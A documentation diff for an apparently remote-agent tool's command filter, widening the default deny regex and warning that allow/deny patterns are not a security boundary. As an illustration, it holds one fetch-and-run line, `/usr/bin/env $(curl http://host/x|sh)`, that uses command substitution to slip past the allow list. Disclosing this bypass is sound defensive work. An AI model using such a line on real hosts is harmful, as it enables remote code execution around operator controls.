@@ -140,7 +140,7 @@ has a `[remote-commands]` block with an allow/deny filter:
     '^/usr/local/bin/.*',
     '^C:\\Windows\\System32\\.*'
   ]
-  deny = ['(\||<|>|;|,|\n|&)']
+  deny = ['(\||<|>|;|,|\n|&|\$|`|\(|\)|\{|\})']
   order = ['allow', 'deny']
   send_back_limit = 4194304
 ```
@@ -151,8 +151,24 @@ practical consequences:
 - The operator must invoke commands by absolute path. `uname -a` is
   not in `/usr/bin/.*` unless sent as `/usr/bin/uname -a`.
 - Shell metacharacters are rejected by the default `deny` regex —
-  pipes, redirects, `;`, `&&`, etc. Wrap multi-step work in a
-  [script](scripts.md) instead.
+  pipes, redirects, `;`, `&&`, and also `$`, backtick, parentheses and
+  braces. The command is written to a script file and run through the
+  shell, so command substitution (`$(...)`, backticks) is a way out of
+  the allow list by itself: `/usr/bin/env $(curl http://host/x|sh)`
+  matches `^/usr/bin/.*` and executes something else entirely. Wrap
+  multi-step work in a [script](scripts.md) instead.
+
+!!! warning "The filter is defence in depth, not a boundary"
+
+    `allow`/`deny` are regular expressions applied to a string that is
+    then handed to a shell. Treat them as a way to keep honest
+    operators inside the intended set, not as a control that contains a
+    determined one. If an operator should not be able to run arbitrary
+    code on a host, do not give them the `commands` permission and
+    leave `[remote-commands] enabled = false` on that agent. Note also
+    that the filter applies only to the command path: a `script` job
+    runs an operator-chosen interpreter and skips the allow/deny check
+    entirely, which is what `[remote-scripts] enabled` gates.
 
 ### Order semantics
 
